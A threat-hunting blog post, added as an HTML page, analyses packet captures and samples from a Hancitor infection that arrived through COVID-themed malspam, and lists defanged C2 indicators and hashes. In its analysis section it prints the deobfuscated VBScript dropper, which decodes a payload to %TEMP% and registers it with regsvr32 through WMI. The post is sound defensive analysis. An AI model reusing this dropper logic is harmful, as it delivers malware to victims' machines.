@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>3/20/2020 - Hancitor w/Coronavirus Themed Malspam | HuntOps</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="3/20/2020 - Hancitor w/Coronavirus Themed Malspam" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="3/20/2020 - Hancitor Infection w/Coronavirus Themed Malspam Packets Hancitor Downloader background (AKA Chanitor)" />
+<meta property="og:description" content="3/20/2020 - Hancitor Infection w/Coronavirus Themed Malspam Packets Hancitor Downloader background (AKA Chanitor)" />
+<link rel="canonical" href="http://localhost:4000/2020/03/20/hancitor.html" />
+<meta property="og:url" content="http://localhost:4000/2020/03/20/hancitor.html" />
+<meta property="og:site_name" content="HuntOps" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-03-20T00:00:00-05:00" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/2020/03/20/hancitor.html","headline":"3/20/2020 - Hancitor w/Coronavirus Themed Malspam","description":"3/20/2020 - Hancitor Infection w/Coronavirus Themed Malspam Packets Hancitor Downloader background (AKA Chanitor)","dateModified":"2020-03-20T00:00:00-05:00","datePublished":"2020-03-20T00:00:00-05:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/03/20/hancitor.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>HuntOps</h1>
+          <p></p>
+          <hr>
+        </div>
+
+        <h1 id="3202020---hancitor-infection-wcoronavirus-themed-malspam">3/20/2020 - Hancitor Infection w/Coronavirus Themed Malspam</h1>
+<ul>
+  <li><a href="http://malware-traffic-analysis.net/2020/03/11/index.html">Packets</a></li>
+  <li><a href="https://www.cyber.nj.gov/threat-profiles/trojan-variants/hancitor">Hancitor Downloader background (AKA Chanitor)</a></li>
+</ul>
+
+<p>Unless you’ve been living under a rock, you’re aware of the global COVID-19 pandemic, also known as Coronavirus…actually…even if you’re under a rock, you’re still likely aware. Adversaries commonly capitalize on these type of events for their malspam lures, <a href="https://krebsonsecurity.com/2020/03/live-coronavirus-map-used-to-spread-malware/">COVID is no different</a>. If the bad guys are using this, as defenders, we need to be prepared. In this situation, malspam is used to distribute the Hancitor (Chanitor) downloader. @mesa_matt reported this wave of COVID malspam <a href="https://twitter.com/mesa_matt/status/1237808758669094913">here</a> and then by <a href="https://isc.sans.edu/forums/diary/Hancitor+distributed+through+coronavirusthemed+malspam/25892/">SANS</a>.</p>
+
+<p><img src="/images/3-20-20-13.png" alt="" /></p>
+
+<p>We’ll start over on the Suricata dashboard to see if anything look suspicious, and as per normal, we have a hint of where to start with the <code class="highlighter-rouge">ET MALWARE Fareit/Pony Downloader Checkin 2</code> alert. As we commonly see with these infections, adversaries frequently do an external IP lookup to see where they are and/or to validate they’ve infected the right victim (for targeted intrusions); that said, remember that an external IP lookup, while interesting, isn’t a smoking gun - so we’ll put that in the “interesting” vs. the “evidence” pile.</p>
+
+<p><img src="/images/3-20-20-1.png" alt="" /></p>
+
+<p>Filtering on the Pony Downloader alert, we can see that <code class="highlighter-rouge">10.3.11.101</code> looks like the internal host as well as <code class="highlighter-rouge">45[.]153[.]73[.]33</code> as the, we’ll call it C2 because the alert calls it <code class="highlighter-rouge">Downloader Checkin 2</code>, external host of interest. Of note, this connection is over port <code class="highlighter-rouge">80</code>, so we should have good metadata to dig through. We’ll also use the HTTP dashboard to see what it can tell us.</p>
+
+<p><img src="/images/3-20-20-2.png" alt="" /></p>
+
+<p>Before we move away from the Suricata dashboard, the alert is called Pony, which is part of the process that Hanciator uses to burrow into an infected system - usually Pony is delivered via a macro-enabled document, with a VBScript, that acts as an installer to download Pony and then Hancitor <a href="https://www.reddit.com/r/blackhat/comments/5oee1h/what_is_a_pony_downloader/">1</a>, <a href="https://www.proofpoint.com/us/threat-insight/post/hancitor-ruckguv-reappear">2</a>, <a href="https://www.fireeye.com/blog/threat-research/2016/09/hancitor_aka_chanit.html">3</a>. Using that OSINT, we know that we’re probably looking for a VB macro, which likely means an Office document.</p>
+
+<p>Okay, lets pop on over to ROCK’s HTTP dashboard and see what we can learn about <code class="highlighter-rouge">45[.]153[.]73[.]33</code>. Here when we apply the filter for our bad IP address, we can see the HOST (<code class="highlighter-rouge">thumbeks[.]com</code>) and the URI’s…all PHP files (<code class="highlighter-rouge">/4/forum[.]php</code>, <code class="highlighter-rouge">/d2/about[.]php</code>, <code class="highlighter-rouge">/mlu/forum[.]php</code>). <a href="https://www.php.net/">PHP</a> is a web-centric scripting language that is perfect for all kinds of useful applications…and malware.</p>
+
+<p><img src="/images/3-20-20-3.png" alt="" /></p>
+
+<p>Applying different filters to this dashboard shows that <code class="highlighter-rouge">10.3.11.101</code> and <code class="highlighter-rouge">45[.]153[.]73[.]33</code> are the only two systems talking back and forth with <code class="highlighter-rouge">thumbeks[.]com</code>, so lets look in the Discover app to learn a bit more.</p>
+
+<p>I’ve searched for the host that we’re interested in and applied the <code class="highlighter-rouge">http</code> dataset filter. Of note, I’ve added fields that I’m most interested in source IP, URL, etc. but I’ve also added the <code class="highlighter-rouge">Query PCAP</code> field so that I can use that to quickly carve the packets using Docket and Stenographer, both built into RockNSM. This traffic is over port 80 and likely unencrypted, so we should be able to get some good data from it. Finally, we’ll know more when we look at the HTTP headers, but the HTTP Method is a POST, so this is likely data exfil or a checkin of some type.</p>
+
+<p><img src="/images/3-20-20-4.png" alt="" /></p>
+
+<p>I’ll carve the PCAPs for <code class="highlighter-rouge">/4/forum[.]php</code>, <code class="highlighter-rouge">/d2/about[.]php</code>, and <code class="highlighter-rouge">/mlu/forum[.]php</code> to analyze them.</p>
+
+<p>With the first <code class="highlighter-rouge">/4/forum[.]php</code>, we can see that this is uploading a GUID and build number of the implant along with the hostname (<code class="highlighter-rouge">[redacted]-WIN10</code>), the userID (<code class="highlighter-rouge">[redacted]-WIN10\[username]</code>) and the host IP address (<code class="highlighter-rouge">IP=[redacted]</code>) along with a Base64 encoded string</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NMNMARZAEg4OCkBVVQkSFQpUGwgOGxwcExQTDg4fH1QZFRdVDQpXExQZFg8eHwlVCRUeEw8XJRkVFwo
+bDlVLBhIODgpAVVUYHw4bVBsIDhscHBMUEw4OHx9UGRUXVQ0KVxMUGRYPHh8JVRwVFA4JVUsGEg4OCg
+lAVVUJEwkJVBkVVBMUVUsGEg4OCkBVVRcTGQgVGBYbHhMUHREPFg8YD1QZFRdVSwYSDg4KQFVVCQ4VG
+REXGwgRHw4IHwwVFg8OExUUVBkVF1VLBwEYQBIODgpAVVUJEhUKVBsIDhscHBMUEw4OHx9UGRUXVQ0K
+VxMUGRYPHh8JVQkVHhMPFyUZFRcKGw5VSAYSDg4KQFVVGB8OG1QbCA4bHBwTFBMODh8fVBkVF1UNClc
+TFBkWDx4fCVUcFRQOCVVIBhIODgoJQFVVCRMJCVQZFVQTFFVIBhIODgpAVVUXExkIFRgWGx4TFB0RDx
+YPGA9UGRUXVUgGEg4OCkBVVQkOFRkRFxsIER8OCB8MFRYPDhMVFFQZFRdVSAc=
+</code></pre></div></div>
+<p>This is followed by posting binary files from <code class="highlighter-rouge">/d2/about[.]php</code> and <code class="highlighter-rouge">/mlu/forum[.]php</code></p>
+
+<p><img src="/images/3-20-20-5.png" alt="" />
+<img src="/images/3-20-20-6.png" alt="" />
+<img src="/images/3-20-20-7.png" alt="" /></p>
+
+<p>After the initial <code class="highlighter-rouge">/4/forum[.]php</code> + <code class="highlighter-rouge">/d2/about[.]php</code> + <code class="highlighter-rouge">/mlu/forum[.]php</code>, there are 3 more POSTs to <code class="highlighter-rouge">/4/forum[.]php</code> which have 2 different Base64 encoded strings (<code class="highlighter-rouge">CMNXARRABw==</code> and <code class="highlighter-rouge">AZAZARRABw==</code>). In checking online for those strings, there was 1 link to <a href="https://www.hybrid-analysis.com/sample/fdbc89d95c002985f71ef3a8471bded05e71559874f36dd12186def8eef73e81?environmentId=100">Hybrid-Analysis</a> for a Hancitor analysis from 2018 (we knew this was Hancitor already, but this is the first evidence pointing us that direction).</p>
+
+<p>Now that we have a good hit regarding <code class="highlighter-rouge">thumbeks[.]com</code>, let’s remove <code class="highlighter-rouge">thumbeks[.]com</code>, <code class="highlighter-rouge">/4/forum[.]php</code>, <code class="highlighter-rouge">/d2/about[.]php</code>, and <code class="highlighter-rouge">/mlu/forum[.]php</code> and move onto other suspicious traffic.</p>
+
+<p>When looking at the remaining traffic, it became pretty obvious that there was more than I could just sift through in the Discover app and honestly say I found bad traffic. So, let’s profile the DNS traffic, use a data table visualization, and remove the IP lookup API (<code class="highlighter-rouge">api.ipify.org</code> and <code class="highlighter-rouge">thumbeks[.]com</code>…ah, 2 entries and we now have 4 additional indicators to research to see if they are bad (2 hosts, 2 IPs)</p>
+
+<p><img src="/images/3-20-20-8.png" alt="" /></p>
+
+<p>Lets start with the hosts (<code class="highlighter-rouge">freetospeak[.]me</code> and <code class="highlighter-rouge">shop[.]artaffinittee[.]com</code>) and see what else we know about them. Looking at the DNS, domains, and files, we can see that there is a file located at <code class="highlighter-rouge">freetospeak[.]me/0843_43[.]php</code>, but the filename is <code class="highlighter-rouge">SE-670131329809_5500[.]zip</code>.</p>
+
+<p><img src="/images/3-20-20-9.png" alt="" /></p>
+
+<p>Before we move further into <code class="highlighter-rouge">freetospeak[.]me</code>, let’s look at that IP address (<code class="highlighter-rouge">8[.]208[.]77[.]171</code>) and see if anyone else communicated with that IP and no one did. This is the proper process for analysis, but sometimes there’s not any additional data.</p>
+
+<p>Moving on, we’ll grab the packets to see what’s there, but in doing a quick Google search for <code class="highlighter-rouge">0843_43.php</code> I can see that <a href="https://urlhaus.abuse.ch/url/323970/">Abuse.ch</a> has listed some of the payloads that are delivered from this URI and they follow what we’ve observed - two capital letters, a dash, 12 numbers, an underscore, 4 numbers, and a zip file extension. We’ll have a regex search in the Detection Logic section, but lets check out the packets.</p>
+
+<p><img src="/images/3-20-20-10.png" alt="" /></p>
+
+<p>Lets use the Export HTTP Object of Wireshark to grab that file so we can do some additional analysis. Running the <code class="highlighter-rouge">file</code> command, we see that this isn’t a PHP file, but a zip archive (we assumed that based on the file.name field in ROCK, but that’s why we check).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/file 0843_43.php
+0843_43.php: Zip archive data, at least v2.0 to extract
+</code></pre></div></div>
+
+<p>Great, let’s grab some metadata about the file with <code class="highlighter-rouge">exiftool</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/exiftool 0843_43.php
+ExifTool Version Number         : 11.85
+File Name                       : 0843_43.php
+Directory                       : .
+File Size                       : 225 kB
+File Modification Date/Time     : 2020:03:16 16:04:34-05:00
+File Access Date/Time           : 2020:03:16 16:04:48-05:00
+File Inode Change Date/Time     : 2020:03:16 16:04:53-05:00
+File Permissions                : rw-r--r--
+File Type                       : ZIP
+File Type Extension             : zip
+MIME Type                       : application/zip
+Zip Required Version            : 20
+Zip Bit Flag                    : 0
+Zip Compression                 : Deflated
+Zip Modify Date                 : 2020:03:10 19:22:42
+Zip CRC                         : 0x8780657b
+Zip Compressed Size             : 230297
+Zip Uncompressed Size           : 1130515
+Zip File Name                   : SE670131329809.vbs
+</code></pre></div></div>
+<p>We can see that the <code class="highlighter-rouge">Zip File Name</code> contains <code class="highlighter-rouge">SE670131329809.vbs</code>. Interesting! Let’s list the contents of the zip file and see if there’s anything else interesting in there.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/unzip -l 0843_43.php
+Archive:  0843_43.php
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+  1130515  03-10-2020 19:22   SE670131329809.vbs
+---------                     -------
+  1130515                     1 file
+</code></pre></div></div>
+<p>We can see that the archive was created on March 10, 2020 and that there is one file in there (<code class="highlighter-rouge">SE670131329809.vbs</code>). Let’s unzip and poke around on the file.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/unzip -K 0843_43.php
+Archive:  0843_43.php
+  inflating: SE670131329809.vbs
+</code></pre></div></div>
+<p>Now, let’s grab the hash of this script and see if anyone else has already done the hard work.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sbin/md5 SE670131329809.vbs
+MD5 (SE670131329809.vbs) = 8eb933c84e7777c7b623f19489a59a2a
+</code></pre></div></div>
+<p>As it would turn out, it looks like someone has already submitted this to <a href="https://www.virustotal.com/gui/file/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51/detection">VirusTotal</a> and its got a 20/59 score, so this looks like a good hit! As we continue to look at the <a href="https://www.virustotal.com/gui/file/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51/behavior/Lastline">behavior</a> of this file, it looks like it’s responsible for our connections to <code class="highlighter-rouge">thumbeks[.]com</code> and <code class="highlighter-rouge">api[.]ipify[.]org</code> (this is great because now we have a real reason to look at IPIFY, whereas before it was just suspicious, but now we can connect it to malware, so we can dig into that more), and a new domain (<code class="highlighter-rouge">cludions[.]com</code> - but we don’t have any traffic to that domain in our sample). Of note, VT has some neat node analysis of this sample <a href="https://www.virustotal.com/graph/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51">here</a>.</p>
+
+<p>Now that we’ve got a solid line between IPIFY and our infected host, so let’s see who communicated with that external service. It doesn’t look like anyone beyond our known infected host did, but this is an example of connecting something suspicious to known bad. We don’t do figurative hand-waving here, so it was good to make that association.</p>
+
+<p>Before we move on, let’s take a look at the VBScript. I’ll caveat it with the fact that we’ll just going to look and see if there’s anything of value here vs. trying to RE it.</p>
+
+<p>First off, looking at the metadata, it appears that it was also created on 3/10 (same as the time that it was added to the zip archive it was stored in). It’s unclear if this was an automated process, indicating this is a process to create mass volumes of files for multple campaigns…but based on what was observed <a href="https://urlhaus.abuse.ch/url/323970/">online</a>, this is likely auto-created and archived.</p>
+
+<p>It contains a bunch of numbers+<code class="highlighter-rouge">l</code> at the beginning and end of the script. I have an assumption that this is some sort of binary that is fed into <code class="highlighter-rouge">Dim GtYbDTHjR: Set GtYbDTHjR=CreateObject("Scripting.FileSystemObject"): Dim etEWDmZOL: Set etEWDmZOL=CreateObject("ADODB.Stream")</code> to create either Pony or Hancitor, and then registered as a DLL with <code class="highlighter-rouge">.Create "regsvr32.exe -s "+CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(Cint("2"))+"\")+"adobe.txt",,,processid</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'3l70l69l69l79l69l69l69l259l70l69l69l69l69l69l69l69l69l69l69l69l69l69l133l69l69
+l133l115l169l166l185l166l69l69l69l113l75l71l69l69l309l70l69l69l75l71l69l69l269l
+70l69l69l69l69l69l69l69l69l69l69l69l69l69l133l69l69l261l115l183l184l183l168l69l
+69l69l169l77l69l69l69l69l73l69l69l79l69l69l69l275l72l69l69l69l69l69l69l69l69l69
+l69l69l69l69l133l69l69l133l115l183l170l177l180l168l69l69l289l75l69l69l69l85l...
+</code></pre></div></div>
+<p>There’s also a huge variable defined with a <code class="highlighter-rouge">Split</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SsfkRq=Split("108,121,175,31,34,31,31,31,35,31...
+</code></pre></div></div>
+<p>Beyond the basics of what a <code class="highlighter-rouge">Split</code> is, I’m not sure what that is doing. It is referenced below with <code class="highlighter-rouge">.WriteText YZyNjfA(SsfkRq)</code></p>
+
+<p>Stripping all that out, we’re left with:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Function YZyNjfA(YRMVEpWm)
+svNcfFav=""
+'Function siahdgfkiqadsf
+ZBgKJYn=0
+adsfsdasd=31
+'numbers=3782347438234
+'UBoundWhileFunctionEnds
+Do While ZBgKJYn =&lt; UBound(YRMVEpWm)
+svNcfFav=svNcfFav+ChrW(YRMVEpWm(ZBgKJYn)-adsfsdasd)
+'End Function
+ZBgKJYn=ZBgKJYn+1
+Loop
+'.Close
+YZyNjfA=svNcfFav
+End Function
+Dim GtYbDTHjR: Set GtYbDTHjR=CreateObject("Scripting.FileSystemObject"): Dim etEWDmZOL: Set etEWDmZOL=CreateObject("ADODB.Stream")
+With etEWDmZOL
+.Type=2
+.Charset="ISO-8859-1"
+.Open()
+.WriteText YZyNjfA(SsfkRq)
+
+.Position=0
+.SaveToFile CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)+"\")+"adobe.txt", 2
+.Close
+End With
+Set HeJddyu=GetObject("winmgmts:Win32_Process")
+With HeJddyu
+.Create "regsvr32.exe -s "+CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(Cint("2"))+"\")+"adobe.txt",,,processid
+End With
+</code></pre></div></div>
+
+<p>This is a bit beyond my bailiwick of network analysis, but it appears that it is a timer that counts down by <code class="highlighter-rouge">31</code>, listens to a stream for a file that it writes as <code class="highlighter-rouge">abobe.txt</code>, and finally the file is registered as a DLL on the system.</p>
+
+<p>So, that’s great, but I wasn’t able to extract <code class="highlighter-rouge">adobe.txt</code> without some help. I called in a lifeline with the great Dustin Lee (<a href="https://twitter.com/_dustinlee">@_dustinlee</a>) who suggested (correctly) to remove the part of the script that actually executes the binary and it should drop it in the <code class="highlighter-rouge">%TEMP%</code>directory as denoted by <code class="highlighter-rouge">.SaveToFile CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)+"\")+"adobe.txt", 2</code>. So, I removed the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set HeJddyu=GetObject("winmgmts:Win32_Process")
+With HeJddyu
+.Create "regsvr32.exe -s "+CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(Cint("2"))+"\")+"adobe.txt",,,processid
+End With
+</code></pre></div></div>
+<p>After removing that, I ran <code class="highlighter-rouge">cscript SE670131329809.vbs</code>, and there in <code class="highlighter-rouge">%USERPROFILE%\AppData\Local\Temp</code> was <code class="highlighter-rouge">adobe.txt</code>! Phew…from my foxhole, quite a hard fought collection.</p>
+
+<p>Okay, let’s look at the metadata here. Of note, it’s a DLL (which we expected from the DLL registration routine in the script <code class="highlighter-rouge">Create "regsvr32.exe -s "</code>), it’s called “Windows Media Center Store ipdate Manager” (looks like a typo - nice indicator to search for).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/exiftool adobe.txt
+ExifTool Version Number         : 11.30
+File Name                       : adobe.txt
+Directory                       : .
+File Size                       : 248 kB
+File Modification Date/Time     : 2020:03:19 18:02:20-05:00
+File Access Date/Time           : 2020:03:19 18:05:41-05:00
+File Inode Change Date/Time     : 2020:03:19 18:05:41-05:00
+File Permissions                : rwxr-xr-x
+File Type                       : Win32 DLL
+File Type Extension             : dll
+MIME Type                       : application/octet-stream
+Machine Type                    : Intel 386 or later, and compatibles
+Time Stamp                      : 2020:03:10 06:41:39-05:00
+Image File Characteristics      : Executable, No line numbers, No symbols, 32-bit, DLL
+PE Type                         : PE32
+Linker Version                  : 2.50
+Code Size                       : 113152
+Initialized Data Size           : 140288
+Uninitialized Data Size         : 0
+Entry Point                     : 0x1c000
+OS Version                      : 4.0
+Image Version                   : 0.0
+Subsystem Version               : 4.0
+Subsystem                       : Windows GUI
+File Version Number             : 6.1.7601.17514
+Product Version Number          : 6.1.7601.17514
+File Flags Mask                 : 0x003f
+File Flags                      : (none)
+File OS                         : Windows NT 32-bit
+Object File Type                : Dynamic link library
+File Subtype                    : 0
+Language Code                   : English (U.S.)
+Character Set                   : Unicode
+Company Name                    : Microsoft Corporation
+File Description                : Windows Media Center Store ipdate Manager
+File Version                    : 6.1.7601.17514 (win7sp1_rtm.101119-1850)
+Internal Name                   : mcipdate.exe
+Legal Copyright                 : © Microsoft Corporation. All rights reserved.
+Original File Name              : mcipdate.exe
+Product Name                    : Microsoft® Windows® Operating System
+Product Version                 : 6.1.7601.17514
+</code></pre></div></div>
+
+<p>Grabbing a quick hash and checking it on VirusTotal identified this as <a href="https://www.virustotal.com/gui/file/291a4eb06358eca87fbc1f133ee162b6c532f4ec3e6f39c2646cde5de60e80f9/detection">Hancitor</a>!</p>
+
+<p>Okay, moving on to <code class="highlighter-rouge">shop[.]artaffinittee[.]com</code>, which as a reminder, we identified this by profiling DNS traffic above.</p>
+
+<p>There are three things that we can dig into:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">/wp-includes/sodium_compat/1</code> - <code class="highlighter-rouge">19fe0b844a00c57f60a0d9d29e6974e7</code></li>
+  <li><code class="highlighter-rouge">/wp-includes/sodium_compat/2</code> - <code class="highlighter-rouge">204f36fb236065964964a61d4d7b1b9c</code></li>
+  <li><code class="highlighter-rouge">shop[.]artaffinittee[.]com</code>’s IP address of <code class="highlighter-rouge">68[.]183[.]232[.]255</code></li>
+</ul>
+
+<p>Let’s first see if anyone else went that IP address, which they didn’t, so we can list that as an indicator, but there’s nothing else to dig in there (we’ll do some IP analysis towards the end).</p>
+
+<p><img src="/images/3-20-20-11.png" alt="" /></p>
+
+<p>Grabbing the packets for <code class="highlighter-rouge">/wp-includes/sodium_compat/{1,2}</code>, we can see that we’re dealing with a binary file that we can probably do some analysis of.</p>
+
+<p><img src="/images/3-20-20-12.png" alt="" /></p>
+
+<p>When pulling the files apart, they’re binary files but they seem like they’re into the RE category, which is beyond my capabilities. Of note, they are listed as indicators by a DigitalSide OSINT TI list.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"2767": {
+    "md5": "19fe0b844a00c57f60a0d9d29e6974e7",
+    "sha1": "3505b4a6cd2f1bf3cb3628b9e3eb25c940ab559a",
+    "sha256": "d1e56e455e3a50d8e461665e46deb1979a642b32710433f59e7a16fb5e4abada",
+    "url": [
+        "http://beta.artaffinittee.com/wp-includes/fonts/1" &lt;- note different URI, but same file
+    ]
+},
+"2768": {
+    "md5": "204f36fb236065964964a61d4d7b1b9c",
+    "sha1": "b383d4aedea5de89a73d2cfda9d3bfdef94540ea",
+    "sha256": "4c8c3005642b01eb3db098b34ce3c7a089f12566bd67a7720c48e2fe751bfcb1",
+    "url": [
+        "http://beta.artaffinittee.com/wp-includes/fonts/2" &lt;- note different URI, but same file
+    ]
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+<p>So, using ROCK, we identified a malicious domain that led us all the way back through the compromise to the initial point of infection and collected several observations along the way. Check out the detection logic for signatures and analysis.</p>
+
+<h2 id="detection-logic">Detection Logic</h2>
+<p><a href="https://github.com/huntops-blue/detection-logic/blob/master/hancitor.md">Additional analysis, modeling, and signatures (KQL and Yara)</a>.</p>
+
+<h2 id="artifacts">Artifacts</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>45[.]153[.]73[.]33 - Pony Downloader C2
+thumbeks[.]com - Pony Downloader C2
+/4/forum[.]php - Hancitor C2
+/d2/about[.]php - Pony Downloader C2
+/mlu/forum[.]php - Pony Downloader C2
+freetospeak[.]me - Initial Infection
+68[.]208[.]77[.]171 - Initial Infection
+shop[.]artaffinittee[.]com - Part of Hancitor infrastructure
+68[.]183[.]232[.]255 - Part of Hancitor infrastructure
+5c9c955449d010d25a03f8cef9d96b41 - VBScript archive (0843_43.php)
+8eb933c84e7777c7b623f19489a59a2a - VBScript dropper (SE670131329809.vbs)
+6ad619702dad7c8fc1cefd3bc7967cf4 - Hancitor binary
+19fe0b844a00c57f60a0d9d29e6974e7 - Part of Hancitor infrastructure (1)
+204f36fb236065964964a61d4d7b1b9c - Part of Hancitor infrastructure (2)
+</code></pre></div></div>
+
+<p>Until next time, cheers and happy hunting!</p>
+
+
+      </section>
+
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-158770799-1', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
